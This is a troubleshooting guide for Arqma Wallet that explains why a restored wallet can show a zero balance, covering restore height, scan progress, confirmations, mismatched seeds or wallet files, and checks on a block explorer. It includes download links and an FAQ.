![Arqma Wallet](assets/banner-article.png)

<h1 align="center">Arqma Wallet balance is zero after a restore</h1>

<p align="center">A funded wallet that reads zero, and the rescan that brings it back.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

A zero balance after restoring Arqma Wallet almost never means the funds are gone. The wallet builds its balance from the blocks it has scanned, so a restore height of zero, a scan that has not reached your first deposit, or a payment short of ten confirmations all display as an empty wallet.

## The balance is a scan result, not a stored number

Nothing in the wallet file says "you have X ARQ". The file holds keys; the balance is derived every time by reading the chain and summing the outputs those keys can spend. That is why a restored wallet starts at zero and climbs as the scan advances, and why an old wallet can show a balance the moment it opens if its scan is already complete.

The seed determines which outputs are yours, and the scan determines which of them the wallet has seen. A zero balance means one of those two is not yet in place.

## The restore height is the usual cause

Restore height is the block the wallet starts scanning from, and zero means the first block ever produced. A wallet restored at zero on a chain that has been running for years must read every block before it reaches the one holding your first deposit, and until it does, the correct balance for what it has seen is nothing.

Set the height to the block of the day the wallet was created, or the day before the first deposit arrived. The explorer reports the height for any date, which is how you turn "I made this wallet in March" into a number the wallet accepts. Changing it restarts the scan and changes nothing about your keys.

## A scan still running shows a partial reading

Between the restore height and the tip there is a window where the wallet knows about some of your transactions and not others. During that window the balance is genuinely partial: not wrong, not lost, just incomplete.

The two heights in the status area answer this directly. Scanned height below the node's height means the number on screen is provisional. Scanned height equal to it means the wallet has seen everything the chain has, and a zero at that point is a different problem  -  addressed further down.

## A payment needs confirmations before it settles

Arqma targets a two-minute block time and treats ten confirmations, roughly twenty minutes, as settled. Until a payment has at least one confirmation it is not in a block at all, so the wallet has nothing to add to the balance even though the sender's software says "sent".

Sends made from the current release from the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2) follow that rule like any other, because the confirmations come from the chain rather than from the wallet's version.

Between broadcast and ten confirmations the display may show the payment as pending, as a fraction, or not at all depending on the view. Once the block containing it is scanned, the amount appears; the ten-confirmation mark is what makes it spendable in the eyes of a service.

## One seed, one wallet, one set of addresses

The wallet's addresses are derived from the seed, and the same seed produces the same addresses on every platform and in every interface  -  desktop, mobile and command line share one format. A restored wallet therefore shows the addresses that received your funds, not new ones.

That gives you the cleanest test available: compare the address the wallet shows with the address that was paid. If they match, the wallet is the right wallet and the question is only how far it has scanned. If they differ, you restored a different seed; [Arqma Wallet seed phrase guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-seed-phrase.md) explains why the words rather than the file determine that outcome.

## When the scanned height has passed the deposit

A wallet that has scanned past the block containing your funds and still shows zero is looking at a different wallet, or at a different address within the same wallet than the one you are checking.

Addresses a wallet derives from one seed all belong to that wallet, and their outputs are summed into the same total. A view that groups them separately can look empty in one place while the total is correct, so read the total and the transaction list together.

## Where the wallet file fits

The wallet file is a password-encrypted container, and a restore creates or opens one. If you restored alongside an older file, the application may be showing the older wallet  -  a different seed, different addresses and a different balance.

The file lives in a fixed per-user folder on each system, which is how you confirm which one is open. [Arqma wallet file backup guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-file-location-and-backup.md) lists the paths and covers what a backup has to contain.

## Verify on the explorer before concluding anything

The explorer reads the chain directly, so it is the independent check on both the balance and the heights. Search the receiving address and read the transactions with their block heights.

If the explorer shows the funds, the chain holds them and the wallet's scan is the only open question. If it shows nothing, the funds were never sent to that address, and no amount of rescanning changes that. [Arqma Wallet address format](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-address-format.md) covers what a valid address looks like and why a mistyped one fails rather than paying a stranger.

## What to do in order

1. Read the two heights and compare them with the height of your earliest deposit.
2. If the scanned height is below it, wait, or lower the restore height and rescan.
3. If the scanned height is not moving, treat it as a sync problem rather than a restore problem.
4. If the address the wallet shows is not the address that was paid, you restored a different seed.
5. If the explorer shows nothing for that address either, the payment never arrived.

Each step costs a minute and rules out the one below it. [Arqma Wallet not syncing fix](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-not-syncing.md) takes over at step three.

## Restoring a second time does not help

A second restore of the same seed produces the same wallet with the same addresses; it does not fetch a balance faster. What it does do is start another scan, often with a different height, which is how people end up comparing two partial readings and concluding that funds have vanished.

Restore once, set the height, and let that scan finish.

## FAQ

### Is my money gone if the balance is zero?

Almost never. A zero balance on a restored wallet normally means the scan has not reached your transactions; the chain and the explorer decide the truth.

### Why does the explorer show a balance my wallet does not?

Because the explorer reads the chain while the wallet reads only what it has scanned, and a scanned height below the deposit height produces exactly that gap.

### How long should a restore take before the balance appears?

Minutes with a restore height near your first transaction, hours from zero on an old wallet. The scan counter tells you which case you are in.

### Do subaddresses hold funds separately?

Their outputs belong to the same wallet and the same total; only the display groups them differently.

### Does restoring change my address?

No. The same seed produces the same address, so a different address means a different seed was entered. [Arqma Wallet restore from seed](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-restore-from-seed.md) covers the restore path in full.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [Arqma Wallet restore from seed](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-restore-from-seed.md) | Rebuilding a wallet from 25 words, with the restore height that saves hours. |
| [Arqma Wallet not syncing fix](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-not-syncing.md) | Separating a stale build, a restore height and a dead node in one pass. |
| [Arqma stuck transaction fix](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-stuck-transaction.md) | A pending send, its fee and confirmation, and when to stop waiting. |
| [sending ARQ to an exchange](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-send-to-exchange.md) | Moving ARQ to a venue without payment IDs, memos or a lost deposit. |
